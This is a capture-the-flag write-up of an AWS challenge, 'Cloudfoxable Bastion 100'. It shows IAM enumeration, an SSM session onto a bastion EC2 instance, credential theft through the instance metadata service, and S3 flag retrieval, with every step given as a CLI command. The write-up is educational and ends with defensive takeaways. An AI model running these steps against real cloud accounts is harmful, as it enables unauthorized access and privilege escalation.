# Cloudfoxable - Bastion 100

## Challenge Statement

This challenge required us to enumerate IAM permissions and leverage a Bastion EC2 instance to escalate privileges and retrieve a flag stored in an S3 bucket. By analyzing attached IAM policies and using AWS SSM to access the instance, we uncovered credentials that allowed us to access and download the flag.

## Enumeration and Initial Access

The first step was to enumerate IAM permissions attached to the user `ctf-starting-user`, using the AWS profile `cloudfoxable`. We listed attached user policies:

```bash
aws iam list-attached-user-policies --user-name ctf-starting-user --profile cloudfoxable
```

One of the policies found was **SecurityAudit**, an AWS-managed policy granting read access to multiple AWS services. We retrieved its details:

```bash
aws iam get-policy --policy-arn arn:aws:iam::aws:policy/SecurityAudit --profile cloudfoxable
```

This policy permitted `Get*`, `Describe*`, and `List*` actions, allowing extensive enumeration capabilities.

Another policy, `bastion-ssm`, was found and described:

```bash
aws iam get-policy --policy-arn arn:aws:iam::425670648728:policy/bastion-ssm --profile cloudfoxable
```

Reviewing the policy version confirmed that the user could initiate an SSM session on EC2 instance `i-09a523312d972cb80`:

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::425670648728:policy/bastion-ssm --version-id v1 --profile cloudfoxable
```

## Establishing an SSM Session

With SSM access confirmed, we checked the EC2 instance state:

```bash
aws ec2 describe-instances --instance-ids i-09a523312d972cb80 --profile cloudfoxable
```

Once verified as running, we initiated an SSM session:

```bash
aws ssm start-session --target i-09a523312d972cb80 --profile cloudfoxable
```

## Privilege Escalation via Instance Profile

To escalate privileges, we needed to determine the IAM role attached to the EC2 instance. We retrieved the instance profile using either of these methods:

1. **EC2 Metadata Service:**

   ```bash
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials
   ```

2. **AWS CLI:**
   ```bash
   aws ec2 describe-instances --instance-ids i-09a523312d972cb80 --query "Reservations[].Instances[].IamInstanceProfile" --profile cloudfoxable
   ```

The instance profile `bastion` was linked to the IAM role `reyna`. We extracted its details:

```bash
aws iam get-instance-profile --instance-profile-name bastion --query 'InstanceProfile.Roles[0].[RoleName, Arn]' --profile cloudfoxable
```

## Finding the Flag in S3

We enumerated the policies attached to `reyna` and identified `bastion-s3`:

```bash
aws iam list-attached-role-policies --role-name reyna --profile cloudfoxable
```

Checking its permissions:

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::425670648728:policy/bastion-s3 --version-id v1 --profile cloudfoxable
```

This revealed that the role allowed listing and retrieving objects from S3 bucket `cloudfoxable-bastion-v1ubc`.

Using EC2 metadata service, we obtained temporary credentials:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/reyna
```

After adding these credentials to `~/.aws/credentials` under a new profile, we listed and retrieved the flag:

```bash
aws s3 ls s3://cloudfoxable-bastion-v1ubc --profile bastion
aws s3 cp s3://cloudfoxable-bastion-v1ubc/flag.txt $PWD --profile bastion
```

## Conclusion and Takeaways

This challenge reinforced key cloud security concepts, including IAM enumeration, EC2 metadata abuse, and leveraging temporary credentials for privilege escalation. Key takeaways:

- **Least Privilege Matters:** Overly permissive IAM roles allowed unintended access.
- **SSM Sessions Can Be Powerful:** Attackers with SSM access can pivot to EC2 instances.
- **EC2 Metadata is a Goldmine:** Metadata services provide temporary credentials that can be exploited.
- **Monitor Role Usage:** AWS CloudTrail should be used to detect unauthorized access patterns.

By understanding these weaknesses, defenders can better secure AWS environments against similar attacks. 🚀
